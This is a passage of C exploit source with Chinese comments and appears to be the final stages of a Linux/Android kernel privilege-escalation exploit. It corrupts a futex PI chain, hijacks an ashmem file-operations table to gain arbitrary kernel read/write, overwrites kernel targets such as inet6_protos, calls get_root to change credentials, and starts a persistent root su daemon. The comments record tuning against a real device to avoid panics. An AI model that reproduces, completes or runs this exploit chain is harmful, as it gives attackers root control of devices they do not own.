            fprintf(stderr, "[*] 随后可UDP 到::1: 若写成功 -> inet6_protos[17]=V -> prot->handler 调数据地址 -> oops\n");
        }
    }

    show_paranoid("(写之前");          /* ★用户态可见的内oracle 基线 */
    show_busy("(写之前");              /* ★★ 第二十九轮enqueue oracle 基线 */

    usleep(300000);                     /* 多铺几轮, 确保覆盖 */
    dump_probe("(开消费者前)");

    /* ★★ 第十九轮: 没有确认的T/R 就绝不开消费者。     *    原因: 此时缓冲里是 build_reclaim_buf 预铺的那份或更系, 做waiter 的lock
     *    字段指在缓冲外-> 链走 _raw_spin_trylock 永远失败 -> 内核死循环烧看门狗重启。     *    (第十八轮 aw4 的卡死"正是这个: 那次 slide 本身是错的 */
    if (!g_R && !opt_force_consume && !opt_leak_only) {
        fprintf(stderr, "[!] T/R 未确认⇒拒绝启动消费者(保护设备). 加--force-consume 可强制\n");
    } else {
        fprintf(stderr, "[*] 启动消费者(%s)\n", opt_oneshot ? "oneshot 一发" : "连打 1.5s");
    mark_stage("S4-consumer-go");
        if (opt_trace) {                       /* ★必须在放行之前挂上*/
            int w = 0;
            while (!consumer_tid && w++ < 1000) usleep(1000);
            trace_begin(consumer_tid);
        }
        if (opt_leak_only) {
            /* ★第二十四轮修正 必须【始终不置位】放行位, 否则消费者会抢到 1~2 可竞态.
             * --leak-only 的目的是零风险地只验证T/R 与跨页utp, 绝不能触发链走 */
            fprintf(stderr, "[*] --leak-only: 放行位保持0, 不开消费者 直接观察\n");
        } else {
            /* ★★ 第二十六轮关键修正 【先停重铺 再放行消费者】。             *    旧流程让 waiter 在adjtimex 里无限重铺 会与链走竞态
             *    链走持住 L->wait_lock 期间, 重铺的copy_from_user 会把该字段写回0,
             *    持锁状态被静默破坏 => 链走自旋/活锁 => 看门狗重启真机已复现。             *    现在改为: 先让 waiter 走完最后一次adjtimex 并转入【纯用户态自旋。不碰内核栈,
             *    位W 在链走期间保持完全稳定。*/
            if (!opt_keep_relay) {
                reclaim_stop = 1;
                usleep(50000);                 /* 签waiter 走完最后一次铺设并进入用户态自旋*/
                fprintf(stderr, "[*] 已停掉waiter 重铺(adjtimex 全%ld 次, W 已定格 "
                                "waiter 转入纯用户态自旋\n", g_adj_n);
            } else {
                fprintf(stderr, "[*] --keep-relay: waiter 持续重铺(有竞态风险\n");
            }
            consume_go = 1;
        }
        /* ★毁5ms 只读轮询一次trace 环形缓冲 ——越早拿到卡死点的 PC 越好 */
        for (int k = 0; k < 300; k++) {
            usleep(5000);
            if (opt_trace) trace_poll("consumer", 60);
            /* ★★ 第三十五轮 --aw-fops 时伪 fops 表已经装上 而它的.llseek 槽被
             *    store1 砸成一个.data 地址(任何 lseek 都会跳数据段执行 -> oops)。             *    把暴露窗口从 1.5s 压到 ~0.16s(5 万发), 随后立刻开 fd 并还原。*/
            if (opt_aw_fops && consume_calls >= 50000) break;
        }
        consume_stop = 1;
        consumer_done = 1;   /* ★消费者阶段结来——现在才允设waiter 进内核休真*/
        usleep(200000);
    }

    fprintf(stderr, "[*] consumer: pre=%d(已进 syscall 前置位 calls=%ld ok=%ld err=%ld\n",
            consume_pre, consume_calls, consume_ok, consume_err);
    mark_stage("S4b-consumer-loop-done");
    sync();              /* ★关键: 立即落盘 */
    if (consume_pre && consume_calls == 0)
        fprintf(stderr, "[!] 判定: 消费者【已还syscall 但没返回。 内核里卡住或极慢\n");
    else if (!consume_pre)
        fprintf(stderr, "[*] 判定: 消费者根本没跑到 syscall (线程未调度未启动\n");
    dump_probe("(链走同");

    /* ★★ 第三十四轮 会fops 表劫持的自证式验证同时也是任意内核读写的第一个证明 */
    if (opt_aw_fops && g_R) {
        int hfd = -1;
        if (fops_hijack_verify(KIMAGE_TEXT_BASE + slide, &hfd) == 0 && hfd >= 0) {
            if (opt_no_root) {
                fprintf(stderr, "\n[*] --no-root: 只验证任意读写 不碰 cred\n");
            } else if (get_root(hfd, KIMAGE_TEXT_BASE + slide, opt_shell, opt_cmd) == 0) {
                fprintf(stderr, "\n[*] ★★★★★★★★★★ ROOT 到手 (仅内存 重启即失) ★★★★★★★★★★\n");
                /* ★起常驻root 守护, 设root 真正可用 */
                g_su_fd = hfd;
                g_su_kb = KIMAGE_TEXT_BASE + slide;
                g_su_sel_ready = 1;
                /* ★ZT32：在起root 守护【之前】拆掉伪 fops 表的地雷。                 * 守护会fork+exec 去执行root 命令，而exec 的do_close_on_exec 会对继承
                 * 下去的每一fd 走filp_close -> f_op->flush；不拆这颗雷，任何一次exec
                 * 都可能把设备打进 panic（真机已实测一次，见FINDINGS ZT32）。*/
                fops_defuse(hfd, KIMAGE_TEXT_BASE + slide);
                /* ★★ ZT51 根治: 把每一file->f_op==F 的fd 改回真ashmem_fops.
                 * 做完之后, 本进程无论被谁杀正 do_exit -> filp_close 都不会再碰F. */
                fprintf(stderr, "\n[*] ★★ ZT51 开始fixfops (扫描自身 fd 行 把f_op==F 改回真表)\n");
                fprintf(stderr, "[*]    修掉前 拆雷后F+0x68 回读 = 0x%llx\n",
                        (unsigned long long)fops_probe_flush(hfd, KIMAGE_TEXT_BASE + slide));
                /* ★★★ZT52: 必须【先】清 PI 链 因为紧接着的fixfops 会把任意读写
                 * 通道自己关掉 (f_op 一改回真表, 那个 fd 就没有伪 .write 了. */
                fprintf(stderr, "[*] ★★★ZT52 先清 PI 链(pi_blocked_on := 0), 通道还活着\n");
                gl_clear_pi_blocked_on(hfd, KIMAGE_TEXT_BASE + slide, 1, 2);
                gl_fix_fops(hfd, KIMAGE_TEXT_BASE + slide, 1, 2);
                g_fixfops_done = 1;
                /* ★★★ ZT53: 最后一步 —— 让 waiter 线程把卡在 PI 链上的 owner 摘下来.
                 * 这一步【不需要】任意读写通道 (纯 futex 操作), 所以放在 fixfops 之后也有效.
                 * 做完之后, 进程无论被谁杀死都不会再走 futex_lock_pi 的 PI 链拆除路径. */
                {
                    int w = 0;
                    fprintf(stderr, "[*] ★★★ZT53 piunlock: waiter 对 chain 做 FUTEX_UNLOCK_PI\n");
                    pi_unlock_go = 1;
                    while (!pi_unlock_done && !owner_chain_done && w++ < 500) usleep(10000);
                    fprintf(stderr, "[*]     piunlock done=%d rc=%d errno=%d owner_chain_done=%d (等了 %d ms)\n",
                            pi_unlock_done, pi_unlock_rc, pi_unlock_errno, owner_chain_done, w * 10);
                    fprintf(stderr, "[*]     %s\n", owner_chain_done
                            ? "★★★ owner 已干净摘除 -> 退出/软重启不会再触发 PI 链拆除"
                            : "!!! owner 仍卡住 -> 退出仍有 PI 链风险");
                }
                pthread_t tsd;
                if (pthread_create(&tsd, NULL, su_daemon, NULL) == 0)
                    fprintf(stderr, "[*] ★su socket = %s   用法: ./stage1 --su \"id\"\n",
                            SU_SOCK_PATH);
            }
            else
                fprintf(stderr, "\n[!] 提权未完全生效——见上面日志\n");
        }
    }

    /* ★★ 用户态oracle: 若这次靶点是 sysctl_perf_event_paranoid, 读回值应已改变*/
    show_paranoid("(写之后");
    show_busy("(写之后");              /* ★★ enqueue oracle 判据 */
    fprintf(stderr, "[*] waiter adjtimex 诊断: 调用 %ld 次 最后ret=%ld errno=%ld  (期望 ret=-1 errno=14=EFAULT)\n",
            g_adj_n, g_adj_ret, g_adj_err);

    int rc = 0;
    if (opt_dry) {
        fprintf(stderr, "[*] --dry: 不发 UDP 区 到此为止\n");
    } else if (opt_target_addr) {
        fprintf(stderr, "[*] 用了 --target: 靶点不是 inet6_protos[17], 跳过 UDP(见上面sysctl 读回值\n");
        rc = 1;
    } else {
        fprintf(stderr, "[*] 发送UDP 触发 handler...\n");
        fire_udp();
        usleep(500000);
        fprintf(stderr, "[*] 若内核在此之后没有oops/重启, 说明写原语未命中\n");
        rc = 1;
    }
    /* 关键: 默认不退出 保持线程存活.
     * 目的: 区分"崩在链走"不崩在进程退出时的PI-state 拆除".
     * owner 线程永远阻塞在FUTEX_LOCK_PI(chain), 一旦进程退出 内核要清理     * 那条已被 bug 破坏过的 PI 链-> 极可能崩. 保持存活即可排除这个因素. */
    if (!opt_exit) {
        fprintf(stderr, "[*] PARKED (不退出 ——请观察设备是否存活\n");
        int k = 0;
        for (;;) {
            usleep(1000000);
            if ((++k % 5) == 1) {
                uint64_t fl = fops_probe_flush(g_su_fd, g_su_kb);
                fprintf(stderr, "[*] alive: sched_setattr ok=%ld err=%ld | F+0x68=0x%llx %s"
                                " | fixfops_done=%d | carrier ps_ret=[%d,%d] in_ps=[%d,%d]\n",
                        consume_ok, consume_err, (unsigned long long)fl,
                        fl == 0 ? "(拆雷在位)" : "★★★伪表 .flush 已被栈帧重新污染 -> 必须 !fixfops",
                        g_fixfops_done, carrier_ps_ret[0], carrier_ps_ret[1],
                        carrier_in_ps[0], carrier_in_ps[1]);
                if (probe_page) dump_probe("(parked)");
            }
        }
    }
    return rc;
}
